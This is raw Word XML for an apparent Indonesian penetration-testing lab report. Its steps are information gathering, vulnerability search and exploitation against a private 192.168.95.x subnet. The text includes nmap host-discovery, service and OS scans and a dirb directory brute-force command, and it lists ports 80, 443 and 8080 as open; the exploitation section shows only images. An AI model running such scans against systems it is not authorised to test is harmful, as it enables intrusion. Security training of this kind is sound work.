          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251720704" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="6299E899" wp14:editId="6E2560EB">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>102870</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>817880</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5715000" cy="5292090"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21538"/>
                <wp:lineTo x="21528" y="21538"/>
                <wp:lineTo x="21528" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="10423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7619" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId9"/>
                    <a:srcRect b="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2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CC7">
        <w:t xml:space="preserve">Pada </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>tahap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>ini</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>dilaksanakan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> scanning </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>secara</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>aktif</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>terhadap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>dengan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> port yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>terbuka</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> pada subnet </w:t>
      </w:r>
      <w:r w:rsidR="001326AB">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>192.168.</w:t>
      </w:r>
      <w:r w:rsidR="00480CCD">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>9</w:t>
      </w:r>
      <w:r w:rsidR="00850F79">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00480CCD">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001326AB">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve">/24 dan </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:t>ditemukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve"> IP </w:t>
      </w:r>
      <w:r w:rsidR="00E778A8">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>192.168.9</w:t>
      </w:r>
      <w:r w:rsidR="00850F79">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>5.28</w:t>
      </w:r>
      <w:r w:rsidR="00932C96">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00F02CC7">
        <w:t xml:space="preserve">Hasil scan </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6C0A51" w14:textId="645F76D9" w:rsidR="003925BC" w:rsidRDefault="003925BC"/>
    <w:p w14:paraId="1A2E7DE8" w14:textId="7825D0AC" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="1F2B9A2D" w14:textId="2C437981" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="662C6D96" w14:textId="77777777" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="11455F13" w14:textId="77777777" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="683D55B9" w14:textId="77777777" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="0EB3E66A" w14:textId="77777777" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="2B6F4D50" w14:textId="77777777" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="5844AFFB" w14:textId="77777777" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="1229CBF2" w14:textId="31B14684" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="2C455661" w14:textId="6142AAD7" w:rsidR="00F675A2" w:rsidRDefault="00F675A2"/>
    <w:p w14:paraId="2182B362" w14:textId="73638FED" w:rsidR="004E4349" w:rsidRDefault="00F02CC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8A6500" wp14:editId="3199A395">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-20955</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>228600</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6127750" cy="504825"/>
                <wp:effectExtent l="0" t="0" r="2540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D2FA8" w14:textId="1365E410" w:rsidR="004E4349" w:rsidRDefault="00F02CC7"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 w:rsidR="001E6B5C">
                              <w:t>s</w:t>
                            </w:r>
                            <w:r w:rsidR="00F675A2">
                              <w:t>n</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidR="001E6B5C">
                              <w:t xml:space="preserve"> 192.168.</w:t>
                            </w:r>
                            <w:r w:rsidR="00F675A2">
                              <w:t>9</w:t>
                            </w:r>
                            <w:r w:rsidR="00850F79">
                              <w:t>5</w:t>
                            </w:r>
                            <w:r w:rsidR="00F675A2">
                              <w:t>.0/24</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4F3ECF4E" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349"/>
                          <w:p w14:paraId="37A3B083" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349"/>
                          <w:p w14:paraId="1DB76EE1" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
                            <w:r>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="212566B0" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E43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A650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.65pt;margin-top:18pt;width:482.5pt;height:39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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7DDD2FA8" w14:textId="1365E410" w:rsidR="004E4349" w:rsidRDefault="00F02CC7"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-</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidR="001E6B5C">
                        <w:t>s</w:t>
                      </w:r>
                      <w:r w:rsidR="00F675A2">
                        <w:t>n</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidR="001E6B5C">
                        <w:t xml:space="preserve"> 192.168.</w:t>
                      </w:r>
                      <w:r w:rsidR="00F675A2">
                        <w:t>9</w:t>
                      </w:r>
                      <w:r w:rsidR="00850F79">
                        <w:t>5</w:t>
                      </w:r>
                      <w:r w:rsidR="00F675A2">
                        <w:t>.0/24</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4F3ECF4E" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349"/>
                    <w:p w14:paraId="37A3B083" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349"/>
                    <w:p w14:paraId="1DB76EE1" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
                      <w:r>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="212566B0" w14:textId="77777777" w:rsidR="004E4349" w:rsidRDefault="004E4349"/>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Command yang dijalankan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> pada </w:t>
      </w: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Information Gathering</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E287D8F" w14:textId="05869E0B" w:rsidR="004E4349" w:rsidRDefault="004E4349">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6265B150" w14:textId="1085E69C" w:rsidR="004E4349" w:rsidRDefault="00F02CC7">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Pencarian Kerentanan</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50454E08" w14:textId="20749F6A" w:rsidR="00A50E9C" w:rsidRDefault="00236D5A" w:rsidP="00A50E9C">
      <w:r w:rsidRPr="000270FD">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251721728" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="18FD2C79" wp14:editId="2B0416C0">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>636270</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>685800</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5153025" cy="2637790"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21371"/>
                <wp:lineTo x="21560" y="21371"/>
                <wp:lineTo x="21560" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="2462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87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50E9C">
        <w:t>Setelah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A50E9C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A50E9C">
        <w:t>melakukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A50E9C">
        <w:t xml:space="preserve"> information gathering, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A50E9C">
        <w:t>ditemukan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A50E9C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A50E9C">
        <w:t>bahwa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A50E9C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A50E9C">
        <w:t>terdapat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A50E9C">
        <w:t xml:space="preserve"> port yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A50E9C">
        <w:t>terbuka</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A50E9C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00CD3733">
        <w:t>yaitu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00CD3733">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00724951">
        <w:t>80, 443, 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2140CB7D" w14:textId="32E5F6B2" w:rsidR="00A50E9C" w:rsidRDefault="0029128A" w:rsidP="00A50E9C">
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A1922B" w14:textId="77777777" w:rsidR="0029128A" w:rsidRDefault="0029128A" w:rsidP="00A50E9C"/>
    <w:p w14:paraId="4B7E2505" w14:textId="0F7E9326" w:rsidR="00E778A8" w:rsidRDefault="00B657FE">
      <w:r>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="58478619" w14:textId="2B205D56" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="15567BCD" w14:textId="2F587641" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="4AFBE909" w14:textId="6FBD681D" w:rsidR="00E778A8" w:rsidRDefault="00236D5A">
      <w:r w:rsidRPr="002853D8">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251722752" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5EB80FDD" wp14:editId="56E9957F">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>635635</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>77470</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5153025" cy="5068570"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21513"/>
                <wp:lineTo x="21560" y="21513"/>
                <wp:lineTo x="21560" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="17855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1989" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId11"/>
                    <a:srcRect r="36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06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0820D" w14:textId="23F9CCAB" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="798F4A69" w14:textId="57273E8D" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="29CF0B7E" w14:textId="772B53C8" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="0F3B894A" w14:textId="77777777" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="1A81FAE6" w14:textId="77777777" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="4AC9C432" w14:textId="5BF443E9" w:rsidR="00E778A8" w:rsidRDefault="00E778A8"/>
    <w:p w14:paraId="116CCC83" w14:textId="31E28979" w:rsidR="004E4349" w:rsidRPr="00DE5648" w:rsidRDefault="00236D5A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DE5648">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Berikut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adalah</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> command yang </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>digunakan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untuk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pencarian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kerentanan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F02CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00AC6514">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45AC37A0" wp14:editId="57DE9B71">
                <wp:extent cx="6242050" cy="950976"/>
                <wp:effectExtent l="0" t="0" r="25400" b="20955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0" cy="950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A8A4B" w14:textId="1BABFB69" w:rsidR="00E778A8" w:rsidRDefault="00E778A8" w:rsidP="00B657FE">
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:t>nmap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>
                              <w:t>sV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 w:rsidR="00724951">
                              <w:t>Pn</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidR="00724951">
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r>
                              <w:t>-</w:t>
                            </w:r>
                            <w:r w:rsidR="00724951">
                              <w:t>O</w:t>
                            </w:r>
                            <w:r>
                              <w:t xml:space="preserve"> 192.168.9</w:t>
                            </w:r>
                            <w:r w:rsidR="00724951">
                              <w:t>5.26</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2C96955F" w14:textId="4A03E04B" w:rsidR="0029128A" w:rsidRDefault="00E778A8" w:rsidP="00B657FE">
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00E778A8">
                              <w:t>dirb</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00E778A8">
                              <w:t xml:space="preserve"> http://192.168.</w:t>
                            </w:r>
                            <w:r>
                              <w:t>9</w:t>
                            </w:r>
                            <w:r w:rsidR="00724951">
                              <w:t>5.26</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00E778A8">
                              <w:t>/</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="58ADD59E" w14:textId="4BE9E39F" w:rsidR="00AC6514" w:rsidRDefault="00AC6514" w:rsidP="00AC65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AC37A0" id="Text Box 7" o:spid="_x0000_s1027" type="#_x0000_t202" style="width:491.5pt;height:7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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3EFA8A4B" w14:textId="1BABFB69" w:rsidR="00E778A8" w:rsidRDefault="00E778A8" w:rsidP="00B657FE">
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>nmap</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> -</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>sV</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> -</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidR="00724951">
                        <w:t>Pn</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidR="00724951">
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r>
                        <w:t>-</w:t>
                      </w:r>
                      <w:r w:rsidR="00724951">
                        <w:t>O</w:t>
                      </w:r>
                      <w:r>
                        <w:t xml:space="preserve"> 192.168.9</w:t>
                      </w:r>
                      <w:r w:rsidR="00724951">
                        <w:t>5.26</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2C96955F" w14:textId="4A03E04B" w:rsidR="0029128A" w:rsidRDefault="00E778A8" w:rsidP="00B657FE">
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00E778A8">
                        <w:t>dirb</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00E778A8">
                        <w:t xml:space="preserve"> http://192.168.</w:t>
                      </w:r>
                      <w:r>
                        <w:t>9</w:t>
                      </w:r>
                      <w:r w:rsidR="00724951">
                        <w:t>5.26</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00E778A8">
                        <w:t>/</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="58ADD59E" w14:textId="4BE9E39F" w:rsidR="00AC6514" w:rsidRDefault="00AC6514" w:rsidP="00AC6514"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:anchorlock/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCF1DF0" w14:textId="48B6709A" w:rsidR="005368A4" w:rsidRPr="001C1132" w:rsidRDefault="0011701F" w:rsidP="005368A4">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID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AC1F004" wp14:editId="5A19097E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-37465</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>519329</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="6287465" cy="4091000"/>
                <wp:effectExtent l="0" t="0" r="0" b="5080"/>
                <wp:wrapTight wrapText="bothSides">
                  <wp:wrapPolygon edited="0">
                    <wp:start x="0" y="0"/>
                    <wp:lineTo x="0" y="21526"/>
                    <wp:lineTo x="21532" y="21526"/>
                    <wp:lineTo x="21532" y="0"/>
                    <wp:lineTo x="0" y="0"/>
                  </wp:wrapPolygon>
                </wp:wrapTight>
                <wp:docPr id="11191689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465" cy="4091000"/>
                          <a:chOff x="0" y="0"/>
                          <a:chExt cx="6287465" cy="4091000"/>
                        </a:xfrm>
                      </wpg:grpSpPr>
                      <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                        <pic:nvPicPr>
                          <pic:cNvPr id="202279593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49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5" y="0"/>
                            <a:ext cx="6280150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18800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0355"/>
                            <a:ext cx="6280150" cy="2620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9DCCFE" id="Group 4" o:spid="_x0000_s1026" style="position:absolute;margin-left:-2.95pt;margin-top:40.9pt;width:495.1pt;height:322.15pt;z-index:251725824" coordsize="62874,40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73;width:62801;height:1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">
                  <v:imagedata r:id="rId14" o:title="" croptop="32115f"/>
                </v:shape>
                <v:shape id="Picture 1" o:spid="_x0000_s1028" type="#_x0000_t75" style="position:absolute;top:14703;width:62801;height:26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">
                  <v:imagedata r:id="rId15" o:title=""/>
                </v:shape>
                <w10:wrap type="tight"/>
              </v:group>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F02CC7" w:rsidRPr="00DE5648">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:t>Eksploitasi</w:t>
      </w:r>
      <w:r w:rsidR="00B70138">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00B70138">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00B70138">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00B70138">
        <w:rPr>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6563270A" w14:textId="2FA3663B" w:rsidR="000A6C48" w:rsidRDefault="0011701F" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00023FBA">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251728896" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="586C512C" wp14:editId="1F1E71A7">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-222631</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>3071952</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6280150" cy="2964180"/>
            <wp:effectExtent l="0" t="0" r="6350" b="7620"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21517"/>
                <wp:lineTo x="21556" y="21517"/>
                <wp:lineTo x="21556" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="13052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1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F61">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="id-ID"/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251726848" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="12AC2AB0" wp14:editId="0D8E173F">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-222016</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>39370</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6280150" cy="2943860"/>
            <wp:effectExtent l="0" t="0" r="6350" b="8890"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21525"/>
                <wp:lineTo x="21556" y="21525"/>
                <wp:lineTo x="21556" y="0"/>
                <wp:lineTo x="0" y="0"/>
              </wp:wrapPolygon>
            </wp:wrapTight>
            <wp:docPr id="14814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77F" w:rsidRPr="001C1132">
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="000E777F" w:rsidRPr="001C1132">
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9FAB90" w14:textId="232EE031" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="546A561D" w14:textId="4D88E134" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7131FF80" w14:textId="79EFC135" w:rsidR="000A6C48" w:rsidRDefault="000A6C48" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4608A562" w14:textId="3F8B1512" w:rsidR="000A6C48" w:rsidRDefault="0011701F" w:rsidP="002C3229">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Cascadia Code" w:hAnsi="Cascadia Code" w:cs="Cascadia Code"/>
        </w:rPr>
      </w:pPr>
